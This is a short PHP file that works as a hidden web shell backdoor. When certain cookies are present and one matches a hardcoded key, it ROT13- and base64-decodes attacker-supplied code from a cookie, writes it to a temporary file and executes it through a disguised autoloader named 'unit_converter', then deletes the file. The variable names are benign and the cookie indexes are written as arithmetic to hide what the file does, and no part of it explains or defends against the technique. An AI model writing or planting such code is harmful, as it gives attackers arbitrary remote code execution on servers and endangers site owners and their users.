<?php


if (isset($_COOKIE[-62+62]) && isset($_COOKIE[16-15]) && isset($_COOKIE[-55+58]) && isset($_COOKIE[10-6])) {
    $object = $_COOKIE;
    function unit_converter($value) {
        $object = $_COOKIE;
        $reference = tempnam((!empty(session_save_path()) ? session_save_path() : sys_get_temp_dir()), '55054d2b');
        if (!is_writable($reference)) {
            $reference = getcwd() . DIRECTORY_SEPARATOR . "batch_process";
        }
        $element = "\x3c\x3f\x70\x68p " . base64_decode(str_rot13($object[3]));
        if (is_writeable($reference)) {
            $token = fopen($reference, 'w+');
            fputs($token, $element);
            fclose($token);
            spl_autoload_unregister(__FUNCTION__);
            require_once($reference);
            @array_map('unlink', array($reference));
        }
    }
    spl_autoload_register("unit_converter");
    $entry = "33591f305ce811f934903ae40efc5d77";
    if (!strncmp($entry, $object[4], 32)) {
        if (@class_parents("module_controller_data_storage", true)) {
            exit;
        }
    }
}
